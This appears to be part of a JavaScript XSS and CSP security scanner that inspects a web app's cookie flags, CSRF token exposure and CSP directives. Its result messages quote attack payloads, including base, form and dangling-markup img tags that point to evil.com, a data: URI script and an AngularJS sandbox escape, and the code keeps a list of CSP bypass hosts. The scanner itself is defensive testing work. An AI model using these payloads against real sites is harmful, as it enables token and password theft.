// 23 · EXPLOITING XSS TO CAPTURE PASSWORDS
// 24 · EXPLOITING XSS TO BYPASS CSRF DEFENSES
// ══════════════════════════════════════════════════════════════════════════════
export async function testXssExploitability(base, endpoints = [], cookie, result) {
  section('22 · XSS exploitability — cookie theft, password capture, CSRF bypass  (cats 22, 23, 24)')

  const headers = cookie ? { Cookie: cookie } : {}

  // ── Cat 22: Can XSS steal the session cookie? Check HttpOnly / Secure / SameSite ──
  const rBase = await req(base, { headers })
  const setCookie = rBase.headers?.get?.('set-cookie') || ''

  if (setCookie) {
    const hasHttpOnly = /httponly/i.test(setCookie)
    const hasSecure   = /;\s*secure/i.test(setCookie)
    const sameSiteM   = setCookie.match(/samesite\s*=\s*(\w+)/i)
    const sameSite    = sameSiteM ? sameSiteM[1] : null

    result('Session cookie HttpOnly flag',
           hasHttpOnly ? 'pass' : 'fail',
           hasHttpOnly
             ? 'HttpOnly set — document.cookie inaccessible from JavaScript; XSS cannot exfiltrate session token'
             : 'HttpOnly missing — XSS can read document.cookie and exfiltrate the session token to an attacker-controlled server')

    result('Session cookie Secure flag',
           hasSecure ? 'pass' : 'fail',
           hasSecure
             ? 'Secure set — cookie not transmitted over plain HTTP'
             : 'Secure missing — cookie sent over HTTP; interceptable on non-TLS connections')

    result(`Session cookie SameSite=${sameSite || 'not set'}`,
           sameSite && /strict|lax/i.test(sameSite) ? 'pass' : 'fail',
           sameSite === 'Strict' || sameSite === 'strict' ? 'SameSite=Strict — strongest CSRF protection' :
           sameSite && /lax/i.test(sameSite)             ? 'SameSite=Lax — protects against most CSRF' :
           'SameSite not set or None — cookie sent on all cross-site requests; XSS + CSRF fully exploitable')
  } else {
    result('Cookie security attributes', 'skip', 'no Set-Cookie header observed on base request — run with TEST_EMAIL/TEST_PASSWORD')
  }

  // ── Cat 23: Password auto-fill capture via XSS — check autocomplete settings ──
  const rHtml = await req(base, {
    headers: { Accept: 'text/html,*/*', ...headers },
  })
  if (rHtml.body) {
    const hasPasswordField  = /<input[^>]+type=["']?password["']?/i.test(rHtml.body)
    const autocompleteOff   = /autocomplete=["']?(?:off|new-password)["']?/i.test(rHtml.body)

    if (hasPasswordField) {
      result('Password field autocomplete',
             autocompleteOff ? 'pass' : 'fail',
             autocompleteOff
               ? 'autocomplete=off/new-password — password manager auto-fill suppressed; limits XSS password capture'
               : 'autocomplete not disabled — XSS can inject a fake login form; password manager may auto-fill into attacker-controlled field')
    } else {
      result('Password field autocomplete check', 'skip', 'no <input type="password"> found on base page')
    }
  }

  // ── Cat 24: CSRF token in DOM — XSS can read and replay it to bypass CSRF defenses ──
  if (rHtml.body) {
    const metaCsrf  = /<meta[^>]+(?:csrf|xsrf)[^>]*>/i.test(rHtml.body)
    const inputCsrf = /<input[^>]+(?:csrf|xsrf)[^>]*>/i.test(rHtml.body)
    const jsCsrf    = extractScriptBlocks(rHtml.body).some(s => /csrf.*token|token.*csrf/i.test(s))

    if (metaCsrf || inputCsrf || jsCsrf) {
      const where = [metaCsrf && '<meta> tag', inputCsrf && 'hidden <input>', jsCsrf && 'inline <script>'].filter(Boolean).join(', ')
      result(`CSRF token accessible in DOM (${where})`,
             'fail',
             `CSRF token present in ${where} — any same-origin XSS can read document.querySelector() and replay the token to forge authenticated state-changing requests, fully bypassing CSRF defenses`)
    } else {
      result('CSRF token DOM exposure', 'pass',
             'no CSRF token found in meta tags, hidden inputs, or inline scripts on base page')
    }
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 27 · REFLECTED XSS PROTECTED BY VERY STRICT CSP, WITH DANGLING MARKUP ATTACK
// 28 · REFLECTED XSS PROTECTED BY CSP, WITH CSP BYPASS
// ══════════════════════════════════════════════════════════════════════════════
export async function testCspSecurity(base, endpoints = [], cookie, result) {
  section('27 · CSP analysis — dangling markup exfiltration + CSP bypass vectors  (cats 27, 28)')

  const headers = { Accept: 'text/html,*/*', ...(cookie ? { Cookie: cookie } : {}) }
  const r = await req(base, { headers })

  const cspHeader    = r.headers?.get?.('content-security-policy')
  const cspReportOnly = r.headers?.get?.('content-security-policy-report-only')
  const csp = cspHeader || cspReportOnly || ''

  // ── No CSP at all ──
  if (!csp) {
    result('Content-Security-Policy header absent', 'fail',
           'no CSP deployed — all XSS payloads execute freely; browser has no second line of defence')
    return
  }

  if (cspReportOnly && !cspHeader) {
    result('CSP is in Report-Only mode', 'fail',
           'Content-Security-Policy-Report-Only does not enforce — violations are logged but not blocked')
  } else {
    result('Content-Security-Policy header present', 'pass',
           csp.slice(0, 100) + (csp.length > 100 ? '…' : ''))
  }

  // Parse directives
  const dirs = {}
  for (const part of csp.split(';')) {
    const trimmed = part.trim()
    if (!trimmed) continue
    const [name, ...vals] = trimmed.split(/\s+/)
    dirs[name.toLowerCase()] = vals
  }

  const scriptSrc  = dirs['script-src']   || dirs['default-src'] || []
  const styleSrc   = dirs['style-src']    || dirs['default-src'] || []
  const imgSrc     = dirs['img-src']      || dirs['default-src'] || []
  const connectSrc = dirs['connect-src']  || dirs['default-src'] || []
  const baseUri    = dirs['base-uri']     || []
  const formAction = dirs['form-action']  || []

  const hasNonce = scriptSrc.some(s => s.startsWith("'nonce-"))
  const hasHash  = scriptSrc.some(s => s.startsWith("'sha"))

  // ── Cat 28: CSP bypass vectors ──

  // 1. unsafe-inline
  if (scriptSrc.includes("'unsafe-inline'")) {
    if (hasNonce || hasHash) {
      result("CSP 'unsafe-inline' ignored by modern browsers (nonce/hash present)", 'pass',
             "nonce or hash causes browsers to ignore 'unsafe-inline'; IE and legacy browsers still vulnerable")
    } else {
      result("CSP: 'unsafe-inline' in script-src without nonce/hash", 'fail',
             "all inline <script> tags and event handlers execute — CSP provides no XSS mitigation")
    }
  }

  // 2. unsafe-eval
  if (scriptSrc.includes("'unsafe-eval'")) {
    result("CSP: 'unsafe-eval' in script-src", 'fail',
           "eval(), new Function(), setTimeout(string) allowed — DOM-based XSS using eval sinks fully exploitable")
  }

  // 3. Wildcard host
  if (scriptSrc.some(s => s === '*')) {
    result("CSP: wildcard '*' in script-src", 'fail',
           "scripts from any domain loadable — attacker hosts malicious JS and references it to bypass CSP")
  }

  // 4. data: URI
  if (scriptSrc.some(s => s === 'data:')) {
    result("CSP: 'data:' allowed in script-src", 'fail',
           "<script src=\"data:text/javascript,alert(1)\"> executes — data: URI bypass")
  }

  // 5. Known JSONP / CDN bypass hosts
  const BYPASS_HOSTS = [
    { pattern: 'ajax.googleapis.com',    reason: "hosts AngularJS — load it to use sandbox escape via {{constructor.constructor('alert(1)')()}}" },
    { pattern: 'accounts.google.com',    reason: 'OAuth JSONP endpoint usable as CSP bypass' },
    { pattern: 'cdnjs.cloudflare.com',   reason: 'hosts AngularJS and other bypass-capable libraries' },
    { pattern: 'cdn.jsdelivr.net',       reason: 'hosts AngularJS and other CSP bypass libraries' },
    { pattern: 'storage.googleapis.com', reason: 'user-controlled bucket content loadable as trusted script' },
  ]
  for (const allowed of scriptSrc) {
    for (const { pattern, reason } of BYPASS_HOSTS) {
      if (allowed.includes(pattern)) {
        result(`CSP: bypass via allowed host "${allowed}"`, 'fail', reason)
      }
    }
  }

  // 6. Missing base-uri — attacker can inject <base href=//evil.com>
  if (!baseUri.length) {
    result("CSP: no base-uri directive", 'fail',
           "missing base-uri allows <base href=//evil.com> injection — all relative script/link URLs redirected to attacker domain")
  } else {
    result(`CSP: base-uri ${baseUri.join(' ')}`, 'pass', 'base tag injection prevented')
  }

  // 7. Missing form-action — attacker can inject <form action=//evil.com>
  if (!formAction.length) {
    result("CSP: no form-action directive", 'fail',
           "missing form-action allows <form action=//evil.com> injection — form submissions (including passwords) exfiltrated")
  } else {
    result(`CSP: form-action ${formAction.join(' ')}`, 'pass', 'form action injection prevented')
  }

  // 8. Nonce uniqueness — static nonce is reusable by attacker
  if (hasNonce) {
    const nonceMatch = csp.match(/'nonce-([^']+)'/)
    const nonce1 = nonceMatch?.[1]
    if (nonce1) {
      const r2    = await req(base, { headers })
      const csp2  = r2.headers?.get?.('content-security-policy') || ''
      const n2M   = csp2.match(/'nonce-([^']+)'/)
      const nonce2 = n2M?.[1]

      if (nonce2) {
        result('CSP nonce unique per request',
               nonce1 === nonce2 ? 'fail' : 'pass',
               nonce1 === nonce2
                 ? `static nonce "${nonce1.slice(0, 12)}…" — reusable by attacker to inject <script nonce="${nonce1.slice(0, 8)}…"> and bypass nonce-based CSP`
                 : 'nonce rotates per response — correctly randomised')
      }
    }
  }

  // ── Cat 27: Dangling markup attack — strict CSP blocks XSS but img-src is permissive ──
  const scriptSrcStrict = scriptSrc.length > 0 &&
    !scriptSrc.includes("'unsafe-inline'") &&
    !scriptSrc.includes("'unsafe-eval'") &&
    !scriptSrc.some(s => s === '*')

  if (scriptSrcStrict) {
    result('CSP script-src appears strict', 'pass',
           'no obvious script execution bypass — checking dangling markup exfiltration path')

    // Dangling markup: inject <img src='//evil.com/?  — page content after injection point
    // (e.g. CSRF token in a <input> or <meta>) leaks as part of the image URL
    const imgPermissive = imgSrc.some(s => s === '*' || s === 'https:' || s === 'http:')
    if (imgPermissive) {
      result("CSP: dangling markup exfiltration via permissive img-src", 'fail',
             `img-src allows external hosts (${imgSrc.join(' ')}) — inject <img src='//evil.com/? to capture text after the injection point (CSRF token, email, nonce) as a URL query parameter`)
    } else {
      result(`CSP img-src restricted (${imgSrc.join(' ') || 'inherits from default-src'})`, 'pass',
             'dangling markup image exfiltration path blocked')
    }

    // connect-src — can XSS exfiltrate via fetch() even if script-src is strict?
    const connectPermissive = connectSrc.some(s => s === '*' || s === 'https:' || s === 'http:')
    if (connectPermissive) {
      result("CSP: data exfiltration via permissive connect-src", 'fail',
             "if XSS is achieved (e.g. via nonce reuse), permissive connect-src lets it fetch() stolen data to any external server")
    }
  }

  // ── report-uri / report-to ──
  const hasReporting = 'report-uri' in dirs || 'report-to' in dirs
  const reportDest   = (dirs['report-uri'] || dirs['report-to'] || []).join(' ')
  result('CSP violation reporting',
         hasReporting ? 'pass' : 'err',
         hasReporting
           ? `violations reported to: ${reportDest}`
           : 'no report-uri/report-to — CSP violations are silent; active attacks may go undetected')
}

// ══════════════════════════════════════════════════════════════════════════════
// FULL SUITE RUNNER
// ══════════════════════════════════════════════════════════════════════════════
/**
 * Run the complete XSS & CSP security test suite.
 * @param {object}   opts
 * @param {string}   opts.base        App origin URL (e.g. http://localhost:3000)
 * @param {object[]} [opts.endpoints] Endpoint list from scanProject()
 * @param {string}   [opts.cookie]    Authenticated session cookie string
 */
export async function runXssTests({ base, endpoints = [], cookie } = {}) {
  const stats  = makeStats()
  const result = makeResult(stats)

  try {
    await fetch(base, { signal: AbortSignal.timeout(4000) })
  } catch {
    console.error(`\n${RED}✗ Server not reachable at ${base}${R}`)
    process.exit(1)
  }

  await testReflectedXssHtml(base, endpoints, cookie, result)
  await testStoredXssHtml(base, endpoints, cookie, result)
  await testDomXssDocumentWrite(base, endpoints, cookie, result)
  await testDomXssInnerHtml(base, endpoints, cookie, result)
  await testDomXssJquery(base, endpoints, cookie, result)
  await testXssInAttributes(base, endpoints, cookie, result)
  await testXssInJsStrings(base, endpoints, cookie, result)
  await testAngularJsXss(base, endpoints, cookie, result)
  await testXssFilterBypass(base, endpoints, cookie, result)
  await testStoredXssEventHandler(base, endpoints, cookie, result)
  await testXssExploitability(base, endpoints, cookie, result)
  await testCspSecurity(base, endpoints, cookie, result)

  return stats
}

// ══════════════════════════════════════════════════════════════════════════════
// CLI entry
// ══════════════════════════════════════════════════════════════════════════════
export async function main(argv = process.argv.slice(2)) {
  const base     = argv.find(a => a.startsWith('http')) || 'http://localhost:3000'
  const email    = process.env.TEST_EMAIL    || ''
  const password = process.env.TEST_PASSWORD || ''

  console.log(`\n${BOLD}╔══════════════════════════════════════════════╗`)
  console.log(`║  XSS & CSP Security Test Suite              ║`)
  console.log(`╚══════════════════════════════════════════════╝${R}`)
  console.log(`Target : ${base}`)
  console.log(`Date   : ${new Date().toISOString()}`)

  let endpoints = []
  const projectPath = argv.find(a => !a.startsWith('http') && !a.startsWith('--'))
  if (projectPath) {
    try {
      const { scanProject } = await import('./list-endpoints.mjs')
      const r = scanProject(projectPath)
      endpoints = r.endpoints
      console.log(`${GREEN}✓ Loaded ${endpoints.length} endpoints from ${projectPath}${R}`)
    } catch (e) {
      console.log(`${YLW}⚠ Could not scan project: ${e.message}${R}`)
    }
  }

  let cookie = null
  if (email && password) {
    process.stdout.write(`\nAuthenticating as ${email}... `)
    const origin = base.replace(/\/api.*$/, '')
    try {
      const res = await fetch(`${origin}/api/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      })
      if (res.ok) {
        const sc = res.headers.get('set-cookie')
        const m  = sc?.match(/AUTH=([^;]+)/)
        cookie   = m ? `AUTH=${m[1]}` : null
      }
    } catch {}
    console.log(cookie ? `${GREEN}✓${R}` : `${YLW}failed${R}`)
  }

  if (!cookie) {
    console.log(`\n${YLW}⚠  No session cookie — stored XSS tests will be skipped.`)
    console.log(`   Set TEST_EMAIL and TEST_PASSWORD env vars to authenticate.${R}`)
  }

  const stats = await runXssTests({ base, endpoints, cookie })

  const total = Object.values(stats).reduce((a, b) => a + b, 0)
  console.log(`\n${BOLD}╔══════════════════════════════════════════════╗`)
  console.log(`║  Results                                     ║`)
  console.log(`╚══════════════════════════════════════════════╝${R}`)
  console.log(`  ${GREEN}Passed  (safe)       : ${stats.passed}${R}`)
  console.log(`  ${RED}Failed  (vulnerable) : ${stats.failed}${R}`)
  console.log(`  ${YLW}Errors               : ${stats.errored}${R}`)
  console.log(`  ${DIM}Skipped              : ${stats.skipped}${R}`)
  console.log(`  Total                : ${total}`)

  if (stats.failed > 0) {
    console.log(`\n${RED}${BOLD}⚠  Vulnerabilities found — review FAIL lines above.${R}\n`)
    process.exit(1)
  } else {
    console.log(`\n${GREEN}${BOLD}✓  All executed tests passed.${R}\n`)
  }
}

if (process.argv[1] === fileURLToPath(import.meta.url)) main()
